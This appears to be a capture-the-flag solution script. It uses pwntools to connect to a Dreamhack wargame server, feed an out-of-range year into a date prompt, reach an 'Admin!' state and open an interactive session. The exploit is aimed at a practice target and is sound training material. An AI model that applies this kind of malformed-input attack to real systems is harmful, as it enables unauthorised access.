from pwn import *

port = 19874
rem = remote("host3.dreamhack.games", port)

rem.sendlineafter(b"Year: ", b'100000005')
rem.sendlineafter(b"Month: ", b'12')
rem.sendlineafter(b"Day: ", b'25')
rem.sendlineafter(b"Hour: ", b'10')
rem.sendlineafter(b"Minute: ", b'10')
rem.sendlineafter(b"Second: ", b'10')

rem.recvuntil(b'Admin!')

rem.interactive()
